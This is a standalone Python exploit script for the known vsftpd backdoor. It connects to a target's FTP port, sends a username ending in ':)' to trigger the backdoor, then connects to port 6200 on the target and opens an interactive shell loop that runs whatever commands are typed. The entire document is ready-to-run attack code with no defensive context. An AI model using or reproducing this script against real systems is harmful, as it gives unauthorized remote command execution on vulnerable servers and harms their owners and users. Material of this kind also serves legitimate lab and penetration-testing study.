import socket
import sys

def exploit_vsftpd(target_ip):
    try:
        print(f"[+] Target: {target_ip}")
        
        # Connect to FTP service
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, 21))

        response = s.recv(1024).decode()
        print(f"[+] FTP Banner: {response}")

        # Send malicious payload (username with ":)")
        s.send(b"USER testuser:)\r\n")
        s.send(b"PASS pass\r\n")

        # If the exploit works, it opens a shell on port 6200
        print("[+] Exploit sent! Attempting to connect to shell...")

        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.connect((target_ip, 6200))  # The backdoor opens port 6200
        print("[+] Connected to shell!\n")

        while True:
            cmd = input("Shell> ")
            shell.send(cmd.encode() + b"\n")
            print(shell.recv(4096).decode(), end="")

    except Exception as e:
        print(f"[-] Exploit failed: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit_vsftpd(target_ip)
